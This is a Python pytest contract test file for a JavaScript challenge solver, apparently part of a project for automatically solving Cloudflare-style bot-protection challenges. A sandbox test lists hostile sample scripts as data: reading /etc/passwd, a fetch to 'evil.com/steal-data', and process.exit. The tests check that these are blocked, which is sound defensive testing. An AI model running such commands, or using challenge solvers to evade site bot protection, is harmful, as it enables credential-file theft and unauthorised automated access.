"""Contract test for JavaScript solver interface.

This test validates the JavaScript challenge solver interface.
Tests MUST fail initially to follow TDD principles.
"""

import pytest
from typing import Dict, Any, Optional
from unittest.mock import AsyncMock, Mock

# Import will fail until implementation exists - this is expected for TDD
try:
    from cloudflare_research.challenges import JavaScriptSolver
    from cloudflare_research.models import Challenge
except ImportError:
    # Expected during TDD phase - tests should fail initially
    JavaScriptSolver = None
    Challenge = None


@pytest.mark.contract
@pytest.mark.asyncio
class TestJavaScriptSolver:
    """Contract tests for JavaScript challenge solver."""

    @pytest.fixture
    def solver(self):
        """Create JavaScriptSolver instance for testing."""
        if JavaScriptSolver is None:
            pytest.skip("JavaScriptSolver not implemented yet - TDD phase")
        return JavaScriptSolver()

    @pytest.fixture
    def sample_challenge(self):
        """Sample JavaScript challenge for testing."""
        if Challenge is None:
            return {
                "challenge_id": "test-challenge-123",
                "type": "javascript",
                "url": "https://protected.example.com",
                "context": {
                    "script_content": "var a = 123; var b = 456; return a + b;",
                    "challenge_form": "<form>...</form>",
                    "cookies": {"cf_clearance": "test123"}
                }
            }
        
        return Challenge(
            challenge_id="test-challenge-123",
            request_id="test-request-456",
            type="javascript",
            url="https://protected.example.com",
            solved=False,
            solve_duration_ms=None
        )

    async def test_solver_class_exists(self):
        """Test that JavaScriptSolver class exists."""
        assert JavaScriptSolver is not None

    async def test_solve_method_exists(self, solver):
        """Test that solve() method exists and is callable."""
        assert hasattr(solver, 'solve')
        assert callable(getattr(solver, 'solve'))

    async def test_solve_simple_challenge(self, solver, sample_challenge):
        """Test solving a simple JavaScript challenge."""
        # Contract: solve(challenge) -> solved_challenge
        result = await solver.solve(sample_challenge)

        # Validate result structure
        if isinstance(result, dict):
            assert "solved" in result
            assert "solution" in result
            assert "solve_duration_ms" in result
        else:
            assert isinstance(result, Challenge)
            assert hasattr(result, 'solved')
            assert hasattr(result, 'solve_duration_ms')
            assert hasattr(result, 'solved_at')

    async def test_solve_arithmetic_challenge(self, solver):
        """Test solving arithmetic JavaScript challenge."""
        challenge_data = {
            "challenge_id": "arithmetic-test",
            "type": "javascript",
            "url": "https://example.com",
            "script_content": "var a = 123; var b = 456; var result = a + b; return result;",
            "expected_result": 579
        }

        result = await solver.solve(challenge_data)

        # Should successfully solve arithmetic
        if isinstance(result, dict):
            assert result["solved"] is True
            assert result["solution"] == 579
        else:
            assert result.solved is True

    async def test_solve_complex_challenge(self, solver):
        """Test solving complex JavaScript challenge with obfuscation."""
        challenge_data = {
            "challenge_id": "complex-test",
            "type": "javascript",
            "url": "https://example.com",
            "script_content": """
                function _0x1234(a, b) {
                    var c = a.charCodeAt(0);
                    var d = b.charCodeAt(0);
                    return c + d;
                }
                var result = _0x1234('A', 'B');
                return result;
            """,
            "expected_result": 131  # 'A' (65) + 'B' (66)
        }

        result = await solver.solve(challenge_data)

        # Should handle obfuscated code
        if isinstance(result, dict):
            assert result["solved"] is True
            assert result["solution"] == 131
        else:
            assert result.solved is True

    async def test_solve_timeout_handling(self, solver):
        """Test solver timeout handling."""
        challenge_data = {
            "challenge_id": "timeout-test",
            "type": "javascript",
            "url": "https://example.com",
            "script_content": "while(true) { /* infinite loop */ }",
            "timeout_ms": 1000
        }

        result = await solver.solve(challenge_data)

        # Should handle timeout gracefully
        if isinstance(result, dict):
            assert result["solved"] is False
            assert "error" in result
            assert "timeout" in result["error"].lower()
        else:
            assert result.solved is False
            assert result.error_message is not None

    async def test_solve_syntax_error_handling(self, solver):
        """Test solver handling of JavaScript syntax errors."""
        challenge_data = {
            "challenge_id": "syntax-error-test",
            "type": "javascript",
            "url": "https://example.com",
            "script_content": "var a = 123; var b = ; return a + b;"  # Syntax error
        }

        result = await solver.solve(challenge_data)

        # Should handle syntax errors gracefully
        if isinstance(result, dict):
            assert result["solved"] is False
            assert "error" in result
        else:
            assert result.solved is False
            assert result.error_message is not None

    async def test_solve_security_restrictions(self, solver):
        """Test solver security restrictions against malicious code."""
        malicious_challenges = [
            {
                "challenge_id": "file-access-test",
                "script_content": "require('fs').readFileSync('/etc/passwd', 'utf8')"
            },
            {
                "challenge_id": "network-access-test",
                "script_content": "fetch('http://evil.com/steal-data')"
            },
            {
                "challenge_id": "process-access-test",
                "script_content": "process.exit(1)"
            }
        ]

        for challenge_data in malicious_challenges:
            challenge_data.update({
                "type": "javascript",
                "url": "https://example.com"
            })

            result = await solver.solve(challenge_data)

            # Should block malicious operations
            if isinstance(result, dict):
                assert result["solved"] is False or "error" in result
            else:
                assert result.solved is False or result.error_message is not None

    async def test_solve_performance_requirements(self, solver):
        """Test solver performance for simple challenges."""
        import time

        challenge_data = {
            "challenge_id": "performance-test",
            "type": "javascript",
            "url": "https://example.com",
            "script_content": "var result = 2 + 2; return result;"
        }

        start_time = time.perf_counter()
        result = await solver.solve(challenge_data)
        end_time = time.perf_counter()

        solve_time_ms = (end_time - start_time) * 1000

        # Should solve simple challenges quickly (under 1 second)
        assert solve_time_ms < 1000, f"Solving took {solve_time_ms:.2f}ms, should be <1000ms"

        if isinstance(result, dict):
            assert result["solved"] is True
        else:
            assert result.solved is True

    async def test_solve_invalid_input(self, solver):
        """Test solver with invalid input data."""
        # Missing required fields
        with pytest.raises((ValueError, KeyError, TypeError)):
            await solver.solve({})

        # Invalid challenge type
        invalid_challenge = {
            "challenge_id": "invalid-test",
            "type": "turnstile",  # Not JavaScript
            "url": "https://example.com",
            "script_content": "return 123;"
        }

        with pytest.raises((ValueError, TypeError)):
            await solver.solve(invalid_challenge)

    async def test_solve_dom_manipulation(self, solver):
        """Test solver with DOM manipulation challenges."""
        challenge_data = {
            "challenge_id": "dom-test",
            "type": "javascript",
            "url": "https://example.com",
            "script_content": """
                // Simulate DOM elements
                var document = {
                    getElementById: function(id) {
                        if (id === 'challenge-value') {
                            return { value: '42' };
                        }
                        return null;
                    }
                };
                var element = document.getElementById('challenge-value');
                return parseInt(element.value);
            """,
            "expected_result": 42
        }

        result = await solver.solve(challenge_data)

        # Should handle simulated DOM operations
        if isinstance(result, dict):
            assert result["solved"] is True
            assert result["solution"] == 42
        else:
            assert result.solved is True

    async def test_solve_with_context(self, solver):
        """Test solver using challenge context data."""
        challenge_data = {
            "challenge_id": "context-test",
            "type": "javascript",
            "url": "https://example.com",
            "script_content": "return window.challenge_data.value * 2;",
            "context": {
                "window": {
                    "challenge_data": {"value": 21}
                }
            },
            "expected_result": 42
        }

        result = await solver.solve(challenge_data)

        # Should use provided context
        if isinstance(result, dict):
            assert result["solved"] is True
            assert result["solution"] == 42
        else:
            assert result.solved is True

    async def test_solver_method_signature(self, solver):
        """Test solve() method has correct signature."""
        import inspect

        sig = inspect.signature(solver.solve)
        params = sig.parameters

        # Check required parameter
        assert 'challenge' in params

        # Check return type annotation
        return_annotation = sig.return_annotation
        assert return_annotation is not inspect.Signature.empty

    async def test_solver_configuration(self):
        """Test solver can be configured with options."""
        if JavaScriptSolver is None:
            pytest.skip("JavaScriptSolver not implemented yet - TDD phase")

        config = {
            "timeout_ms": 5000,
            "memory_limit_mb": 64,
            "enable_console": False,
            "sandbox_mode": True
        }

        solver = JavaScriptSolver(config=config)
        assert hasattr(solver, 'solve')

    async def test_multiple_challenges_parallel(self, solver):
        """Test solving multiple challenges in parallel."""
        challenges = []
        for i in range(3):
            challenges.append({
                "challenge_id": f"parallel-test-{i}",
                "type": "javascript",
                "url": f"https://example{i}.com",
                "script_content": f"return {i} + 10;",
                "expected_result": i + 10
            })

        # Solve all challenges
        results = []
        for challenge in challenges:
            result = await solver.solve(challenge)
            results.append(result)

        # All should be solved correctly
        for i, result in enumerate(results):
            if isinstance(result, dict):
                assert result["solved"] is True
                assert result["solution"] == i + 10
            else:
                assert result.solved is True

    async def test_solve_result_timing(self, solver, sample_challenge):
        """Test that solve duration is properly tracked."""
        result = await solver.solve(sample_challenge)

        # Should track timing information
        if isinstance(result, dict):
            assert "solve_duration_ms" in result
            assert isinstance(result["solve_duration_ms"], (int, float))
            assert result["solve_duration_ms"] >= 0
        else:
            assert hasattr(result, 'solve_duration_ms')
            assert isinstance(result.solve_duration_ms, (int, float, type(None)))
            if result.solve_duration_ms is not None:
                assert result.solve_duration_ms >= 0